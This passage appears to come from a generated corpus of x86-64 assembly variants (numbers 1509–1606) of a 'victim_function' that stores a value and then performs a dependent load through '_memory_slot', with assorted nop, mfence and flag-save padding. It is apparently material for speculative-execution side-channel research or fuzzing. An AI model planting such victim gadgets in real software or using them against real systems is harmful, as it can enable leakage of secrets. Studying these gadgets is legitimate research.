	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1509
.Lvictim_function_win0_var1509:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1510
.Lvictim_function_win0_var1510:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1511
.Lvictim_function_win0_var1511:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1512
.Lvictim_function_win0_var1512:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1513
.Lvictim_function_win0_var1513:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1514
.Lvictim_function_win0_var1514:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1515
.Lvictim_function_win0_var1515:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1516
.Lvictim_function_win0_var1516:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1517
.Lvictim_function_win0_var1517:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1518
.Lvictim_function_win0_var1518:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1519
.Lvictim_function_win0_var1519:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1520
.Lvictim_function_win0_var1520:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1521
.Lvictim_function_win0_var1521:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1522
.Lvictim_function_win0_var1522:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1523
.Lvictim_function_win0_var1523:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1524
.Lvictim_function_win0_var1524:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1525
.Lvictim_function_win0_var1525:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1526
.Lvictim_function_win0_var1526:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1527
.Lvictim_function_win0_var1527:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	nop
	nop
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1528
.Lvictim_function_win0_var1528:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	nop
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1529
.Lvictim_function_win0_var1529:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1530
.Lvictim_function_win0_var1530:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1531
.Lvictim_function_win0_var1531:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1532
.Lvictim_function_win0_var1532:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1533
.Lvictim_function_win0_var1533:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1534
.Lvictim_function_win0_var1534:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1535
.Lvictim_function_win0_var1535:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	nop
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1536
.Lvictim_function_win0_var1536:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1537
.Lvictim_function_win0_var1537:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1538
.Lvictim_function_win0_var1538:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1539
.Lvictim_function_win0_var1539:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1540
.Lvictim_function_win0_var1540:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1541
.Lvictim_function_win0_var1541:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1542
.Lvictim_function_win0_var1542:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1543
.Lvictim_function_win0_var1543:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1544
.Lvictim_function_win0_var1544:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1545
.Lvictim_function_win0_var1545:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1546
.Lvictim_function_win0_var1546:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1547
.Lvictim_function_win0_var1547:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1548
.Lvictim_function_win0_var1548:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1549
.Lvictim_function_win0_var1549:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1550
.Lvictim_function_win0_var1550:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1551
.Lvictim_function_win0_var1551:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1552
.Lvictim_function_win0_var1552:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1553
.Lvictim_function_win0_var1553:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1554
.Lvictim_function_win0_var1554:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1555
.Lvictim_function_win0_var1555:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1556
.Lvictim_function_win0_var1556:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1557
.Lvictim_function_win0_var1557:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1558
.Lvictim_function_win0_var1558:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1559
.Lvictim_function_win0_var1559:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1560
.Lvictim_function_win0_var1560:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1561
.Lvictim_function_win0_var1561:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1562
.Lvictim_function_win0_var1562:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1563
.Lvictim_function_win0_var1563:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1564
.Lvictim_function_win0_var1564:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1565
.Lvictim_function_win0_var1565:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1566
.Lvictim_function_win0_var1566:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1567
.Lvictim_function_win0_var1567:
	popq	%rax
	nop
	nop
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1568
.Lvictim_function_win0_var1568:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1569
.Lvictim_function_win0_var1569:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1570
.Lvictim_function_win0_var1570:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1571
.Lvictim_function_win0_var1571:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1572
.Lvictim_function_win0_var1572:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1573
.Lvictim_function_win0_var1573:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1574
.Lvictim_function_win0_var1574:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1575
.Lvictim_function_win0_var1575:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1576
.Lvictim_function_win0_var1576:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1577
.Lvictim_function_win0_var1577:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1578
.Lvictim_function_win0_var1578:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1579
.Lvictim_function_win0_var1579:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1580
.Lvictim_function_win0_var1580:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1581
.Lvictim_function_win0_var1581:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1582
.Lvictim_function_win0_var1582:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1583
.Lvictim_function_win0_var1583:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1584
.Lvictim_function_win0_var1584:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1585
.Lvictim_function_win0_var1585:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1586
.Lvictim_function_win0_var1586:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1587
.Lvictim_function_win0_var1587:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1588
.Lvictim_function_win0_var1588:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1589
.Lvictim_function_win0_var1589:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1590
.Lvictim_function_win0_var1590:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1591
.Lvictim_function_win0_var1591:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1592
.Lvictim_function_win0_var1592:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1593
.Lvictim_function_win0_var1593:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1594
.Lvictim_function_win0_var1594:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1595
.Lvictim_function_win0_var1595:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1596
.Lvictim_function_win0_var1596:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1597
.Lvictim_function_win0_var1597:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1598
.Lvictim_function_win0_var1598:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1599
.Lvictim_function_win0_var1599:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	nop
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1600
.Lvictim_function_win0_var1600:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1601
.Lvictim_function_win0_var1601:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1602
.Lvictim_function_win0_var1602:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1603
.Lvictim_function_win0_var1603:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1604
.Lvictim_function_win0_var1604:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1605
.Lvictim_function_win0_var1605:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1606
